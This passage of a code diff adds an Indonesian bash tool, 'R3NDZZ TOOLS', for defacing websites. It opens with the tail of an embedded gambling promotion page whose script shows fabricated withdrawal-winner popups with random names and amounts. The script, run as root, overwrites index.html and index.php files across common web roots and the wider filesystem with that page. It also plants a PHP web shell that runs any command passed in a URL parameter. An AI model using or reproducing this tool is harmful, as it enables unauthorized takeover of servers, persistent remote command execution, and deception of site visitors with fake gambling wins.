+          return Math.floor(Math.random() * (max - min) + min);
+      }
+      function buatistri(length) {
+          var result = &#39;&#39;;
+          var characters = &#39;bcdfghjklmnpqrstvwxyz&#39;;
+          var charactersLength = characters.length;
+          for (var i = 0; i &lt; length; i++) {
+              result += characters.charAt(Math.floor(Math.random() * charactersLength));
+          }
+          return result;
+      }
+      function buatanak(length) {
+          var result = &#39;&#39;;
+          var characters = &#39;aeiou&#39;;
+          var charactersLength = characters.length;
+          for (var i = 0; i &lt; length; i++) {
+              result += characters.charAt(Math.floor(Math.random() * charactersLength));
+          }
+          return result;
+      }
+      function buatjanda(length) {
+          var result = &#39;&#39;;
+          var characters = &#39;bcdfghjklmnpqrstvwxyz1234567890&#39;;
+          var charactersLength = characters.length;
+          for (var i = 0; i &lt; length; i++) {
+              result += characters.charAt(Math.floor(Math.random() * charactersLength));
+          }
+          return result;
+      }
+      function dibuat(length) {
+          var result = &#39;&#39;;
+          var characters = &#39;****&#39;;
+          var charactersLength = characters.length;
+          for (var i = 0; i &lt; length; i++) {
+              result += characters.charAt(Math.floor(Math.random() * charactersLength));
+          }
+          return result;
+      }
+  
+      setInterval(function () {
+          var y = [&#34;500.000&#34;, &#34;750.000&#34;, &#34;700.000&#34;, &#34;900.000&#34;, &#34;1.000.000&#34;, &#34;3.250.000&#34;, &#34;1.500.000&#34;, &#34;200.000&#34;, &#34;250.000&#34;, &#34;1.900.000&#34;, &#34;2.000.000&#34;, &#34;2.100.000&#34;, &#34;1.150.000&#34;, &#34;2.250.000&#34;, &#34;2.500.000&#34;, &#34;2.700.000&#34;, &#34;2.800.000&#34;, &#34;2.900.000&#34;, &#34;3.000.000&#34;, &#34;200.000&#34;, &#34;450.000&#34;, &#34;3.500.000&#34;, &#34;3.700.000&#34;, &#34;3.900.000&#34;, &#34;4.000.000&#34;, &#34;4.250.000&#34;, &#34;4.500.000&#34;, &#34;4.750.000&#34;, &#34;130.000&#34;, &#34;150.000&#34;, &#34;5.000.000&#34;, &#34;5.120.000&#34;, &#34;5.250.000&#34;, &#34;5.500.000&#34;, &#34;6.000.000&#34;, &#34;8.800.000&#34;, &#34;350.000&#34;, &#34;300.000&#34;, &#34;9.800.000&#34;, &#34;10.000.000&#34;, &#34;12.200.000&#34;, &#34;12.500.000&#34;, &#34;15.000.000&#34;, &#34;150.000&#34;, &#34;125.000&#34;, &#34;24.800.000&#34;, &#34;28.000.000&#34;, &#34;30.200.000&#34;];
+          var d = [&#34;https://trustpositif.com/wp-content/uploads/2024/07/BCA.png&#34;, &#34;https://trustpositif.com/wp-content/uploads/2024/07/MANDIRI.png&#34;, &#34;https://trustpositif.com/wp-content/uploads/2024/07/BNI.png&#34;, &#34;https://trustpositif.com/wp-content/uploads/2024/07/BRI.png&#34;, &#34;https://trustpositif.com/wp-content/uploads/2024/07/DANA.png&#34;, &#34;https://trustpositif.com/wp-content/uploads/2024/07/OVO.png&#34;, &#34;https://trustpositif.com/wp-content/uploads/2024/07/GOPAY.png&#34;];
+          for (let i = 1; i &lt;= 300; i++) {
+              var yy = getRandomInt(1, 48);
+              var dd = getRandomInt(1, 7);
+              var xx = y[yy];
+              var ee = d[dd];
+              var z = getRandomInt(3, 6);
+              var user = buatistri(1) + buatanak(1) + dibuat(z) + buatjanda(1);
+              document.getElementById(&#34;winner-info&#34;).innerHTML = user + &#34; Telah Melakukan WD Sebesar &#34; + xx;
+              document.getElementById(&#34;imageid&#34;).src = ee;
+          }
+          var popup = document.getElementById(&#34;myPopup&#34;);
+          popup.classList.toggle(&#34;show&#34;);
+      }, 3000)
+    </script>
+    <!-- End Notif WD -->
+    <style>
+      @import url(&#34;https://fonts.googleapis.com/css?family=Raleway:900&amp;display=swap&#34;);
+
+:root{
+    --barges-yellow:#8B5CF6;
+    --barges-yellow-light:#A855F7;
+    --barges-yellow-dark:#2E1065;
+    --barges-blue:#22D3EE;
+    --barges-blue-dark:#1E40AF;
+    --black-deep:#0B0B0B;
+    --black-soft:#000;
+    --text-main:#FFFFFF;
+}
+    </style>
+    <style>
+      .ard-sosmed-bar{
+    display:flex;
+    gap:2px;
+    position:fixed;
+    bottom:12%;
+    left:0;
+    z-index:125;
+    width:auto;
+    height:auto;
+    font-family:Raleway,sans-serif;
+    font-size:20px;
+    transition:.7s ease;
+    background:transparent;
+}
+.ard-sosmed-bar.open{transform:translate(0,0)}
+.ard-sosmed-bar.closed{transform:translate(-77%,0);opacity:.85}
+.ard-sosmed-bar.closed:hover{opacity:.9}
+
+.ard-sosmed-bar .left{
+    width:98px;
+    padding:5px;
+    gap:5px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    background:linear-gradient(180deg,var(--barges-yellow-dark),#000);
+    border:2px solid var(--barges-blue);
+    border-radius:15px;
+    z-index:98;
+    box-shadow:
+        0 0 14px rgba(34,211,238,.75),
+        inset 0 0 10px rgba(139,92,246,.25);
+}
+.headlogo{width:100%}
+
+.left div{
+    width:90%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:linear-gradient(
+        135deg,
+        var(--barges-yellow-light),
+        var(--barges-yellow),
+        var(--barges-blue)
+    );
+    border-radius:10px;
+    padding:3px;
+}
+.left div a{
+    width:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+.left div img{width:100%;height:auto}
+
+.ard-sosmed-bar .right{
+    width:40px;
+    padding:10px 0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    z-index:99;
+    background:linear-gradient(
+        180deg,
+        var(--barges-blue),
+        var(--barges-yellow-dark)
+    );
+    border-radius:15px;
+    box-shadow:
+        0 0 16px rgba(34,211,238,.85);
+}
+
+.ard-sosmed-bar .right span{
+    writing-mode:vertical-rl;
+    text-orientation:upright;
+    color:var(--text-main);
+    display:flex;
+    align-items:center;
+    transition:.4s ease;
+    user-select:none;
+    text-shadow:
+        0 0 6px rgba(34,211,238,.9),
+        0 0 3px rgba(0,0,0,.9);
+}
+.ard-sosmed-bar .right span:first-child{
+    width:100%;
+    opacity:1;
+}
+.ard-sosmed-bar .right span:last-child{
+    width:0;
+    opacity:0;
+}
+
+@media(max-width:600px){
+    .ard-sosmed-bar{scale:.7}
+    .ard-sosmed-bar.closed{transform:translate(-98.5%,0)}
+    .ard-sosmed-bar.open{transform:translate(-21%,0)}
+}
+    </style>
+    <div class="ard-sosmed-bar open">
+      <div class="left">
+        <img class="headlogo" src="https://images.linkcdn.cloud/V2/433/logo/logo-1810516806.webp" alt="logo" />
+        <div>
+          <a href="/download/app-1e0fbe5b5cbde375800d84367c7f756cc2b6c107" target="_blank" rel="nofollow">          <img src="https://t.gyazo.com/teams/pompateam/275e8ba50b0316da62b1db9f964c0566.webp" />
+</a>
+        </div>
+        <div>
+          <a href="https://t.ly/KARTEL-BARGES88" target="_blank" rel="nofollow">          <img src="https://t.gyazo.com/teams/pompateam/d768d9c6e1f1742b577a3276091c43a0.webp" />
+</a>
+        </div>
+        <div>
+          <a href="https://rtpslotarmada888.shop/" target="_blank" rel="nofollow">          <img src="https://t.gyazo.com/teams/pompateam/5a7e6a38f263f40991e21453e3274456.webp" />
+</a>
+        </div>
+      </div>
+      <div class="right">
+        <span>        KLIK INFO
+</span>
+        <span>        TUTUP INFO
+</span>
+      </div>
+    </div>
+    <script>
+      const container1=document.querySelector(&#34;.ard-sosmed-bar&#34;);
+const btn1=document.querySelector(&#34;.ard-sosmed-bar .right&#34;);
+const footer1=btn1.querySelector(&#34;span:first-child&#34;);
+const footer2=btn1.querySelector(&#34;span:last-child&#34;);
+
+btn1.addEventListener(&#34;click&#34;,()=&gt;{
+    const closed=container1.classList.contains(&#34;closed&#34;);
+    container1.classList.toggle(&#34;closed&#34;,!closed);
+    container1.classList.toggle(&#34;open&#34;,closed);
+    footer1.style.width=closed?&#34;0&#34;:&#34;100%&#34;;
+    footer1.style.opacity=closed?&#34;0&#34;:&#34;1&#34;;
+    footer2.style.width=closed?&#34;100%&#34;:&#34;0&#34;;
+    footer2.style.opacity=closed?&#34;1&#34;:&#34;0&#34;;
+});
+    </script>
+    <custom-script>
+    </custom-script>
+  </body>
+</html>'
+
+# ==============================================
+# HEADER
+# ==============================================
+show_header() {
+    clear
+    echo -e "${RED}"
+    echo "    ╔═══════════════════════════════════════════════════════════╗"
+    echo "    ║              R3NDZZ TOOLS - DEFACE & PULIHKAN             ║"
+    echo "    ║                    [ PWND BY R3NDZZ ]                     ║"
+    echo "    ╚═══════════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    echo -e "${CYAN}📡 IP VPS: ${GREEN}$IP_VPS${NC}"
+    echo ""
+}
+
+# ==============================================
+# FUNGSI BACKUP
+# ==============================================
+backup_files() {
+    echo -e "\n${YELLOW}[•] Membackup file website...${NC}"
+    mkdir -p "$BACKUP_DIR"
+    
+    # Cari file index.html dan index.php
+    find / -type f \( -name "index.html" -o -name "index.php" -o -name "*.blade.php" \) 2>/dev/null | while read file; do
+        if [ -f "$file" ]; then
+            backup_path="$BACKUP_DIR$(echo "$file" | sed 's|/|_|g')"
+            cp "$file" "$backup_path" 2>/dev/null
+            echo -e "${GREEN}    ✅ Backup: $file${NC}"
+        fi
+    done
+    
+    # Backup juga file konfigurasi penting
+    [ -f "/etc/nginx/nginx.conf" ] && cp "/etc/nginx/nginx.conf" "$BACKUP_DIR/nginx.conf" 2>/dev/null
+    [ -f "/etc/apache2/apache2.conf" ] && cp "/etc/apache2/apache2.conf" "$BACKUP_DIR/apache2.conf" 2>/dev/null
+    
+    echo -e "\n${GREEN}✅ Backup selesai di: $BACKUP_DIR${NC}"
+}
+
+# ==============================================
+# FUNGSI DEFACE
+# ==============================================
+deface() {
+    echo -e "\n${PURPLE}🎨 ====== DEFACE WEBSITE ====== 🎨${NC}"
+    
+    # Backup dulu sebelum deface
+    backup_files
+    
+    # Simpan HTML ke file sementara
+    echo "$HTML_CONTENT" > /tmp/r3ndzz.html
+    
+    echo -e "\n${YELLOW}[•] Mencari target deface...${NC}"
+    
+    # Lokasi umum website
+    TARGETS=(
+        "/var/www/html/index.html"
+        "/var/www/html/index.php"
+        "/var/www/pterodactyl/public/index.html"
+        "/var/www/pterodactyl/public/index.php"
+        "/home/*/public_html/index.html"
+        "/home/*/public_html/index.php"
+        "/usr/local/www/index.html"
+        "/opt/lampp/htdocs/index.html"
+        "/var/www/nginx/html/index.html"
+    )
+    
+    COUNT=0
+    for target in "${TARGETS[@]}"; do
+        eval "for f in $target; do
+            if [ -f \"\$f\" ]; then
+                cp /tmp/r3ndzz.html \"\$f\" 2>/dev/null
+                echo -e \"${GREEN}    ✅ \$f${NC}\"
+                ((COUNT++))
+            fi
+        done" 2>/dev/null
+    done
+    
+    # Cari file index lainnya
+    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -30 | while read file; do
+        if [ -f "$file" ] && [ -w "$file" ]; then
+            cp /tmp/r3ndzz.html "$file" 2>/dev/null
+            echo -e "${GREEN}    ✅ $file${NC}"
+            ((COUNT++))
+        fi
+    done
+    
+    echo -e "\n${GREEN}✅ Total $COUNT file berhasil dideface!${NC}"
+    
+    # Info backdoor sederhana
+    echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>" > /var/www/html/r3ndzz.php 2>/dev/null
+    echo -e "\n${CYAN}🔗 Backdoor: http://$IP_VPS/r3ndzz.php?cmd=id${NC}"
+    
+    rm -f /tmp/r3ndzz.html
+}
+
+# ==============================================
+# FUNGSI PULIHKAN
+# ==============================================
+pulihkan() {
+    echo -e "\n${BLUE}🔄 ====== PULIHKAN WEBSITE ====== 🔄${NC}"
+    
+    # Cari semua backup
+    BACKUPS=($(ls -d /root/backup_web_* 2>/dev/null))
+    
+    if [ ${#BACKUPS[@]} -eq 0 ]; then
+        echo -e "${RED}❌ Tidak ada backup ditemukan!${NC}"
+        return
+    fi
+    
+    echo -e "${YELLOW}Pilih backup yang ingin dipulihkan:${NC}"
+    for i in "${!BACKUPS[@]}"; do
+        echo -e "${GREEN}[$i]${NC} ${BACKUPS[$i]}"
+    done
+    
+    echo -ne "\n${CYAN}Pilih nomor backup: ${NC}"
+    read choice
+    
+    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -lt "${#BACKUPS[@]}" ]; then
+        SELECTED="${BACKUPS[$choice]}"
+        
+        echo -e "\n${YELLOW}[•] Memulihkan dari $SELECTED...${NC}"
+        
+        # Restore file backup
+        find "$SELECTED" -type f | while read backup; do
+            filename=$(basename "$backup")
+            # Cari file asli berdasarkan pattern
+            original_path=$(find / -name "*${filename#*_}" 2>/dev/null | head -1)
+            if [ -n "$original_path" ]; then
+                cp "$backup" "$original_path" 2>/dev/null
+                echo -e "${GREEN}    ✅ Pulihkan: $original_path${NC}"
+            fi
+        done
+        
+        echo -e "\n${GREEN}✅ Pemulihan selesai!${NC}"
+    else
+        echo -e "${RED}Pilihan tidak valid!${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI SHOW MENU
+# ==============================================
+show_menu() {
+    show_header
+    
+    echo -e "${WHITE}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${WHITE}║                 MENU UTAMA                     ║${NC}"
+    echo -e "${WHITE}╠════════════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║                                                ║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[1]${NC} 🎨  DEFACE WEBSITE                   ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[2]${NC} 🔄  PULIHKAN WEBSITE                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[0]${NC} 🚪  KELUAR                           ${WHITE}║${NC}"
+    echo -e "${WHITE}║                                                ║${NC}"
+    echo -e "${WHITE}╚════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -ne "${YELLOW}➤ Pilih menu [0-2]: ${NC}"
+}
+
+# ==============================================
+# CEK ROOT
+# ==============================================
+if [[ $EUID -ne 0 ]]; then
+   echo -e "${RED}❌ Harus root! Jalankan dengan sudo.${NC}"
+   exit 1
+fi
+
+# ==============================================
+# MAIN LOOP
+# ==============================================
+while true; do
+    show_menu
+    read choice
+    
+    case $choice in
+        1)
+            deface
+            ;;
+        2)
+            pulihkan
+            ;;
+        0)
+            echo -e "\n${GREEN}Terima kasih telah menggunakan R3NDZZ Tools!${NC}"
+            echo -e "${CYAN}🔥 PWND BY R3NDZZ 🔥${NC}\n"
+            exit 0
+            ;;
+        *)
+            echo -e "\n${RED}Pilihan tidak valid!${NC}"
+            ;;
+    esac
+    
+    echo ""
+    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
+    read
+done
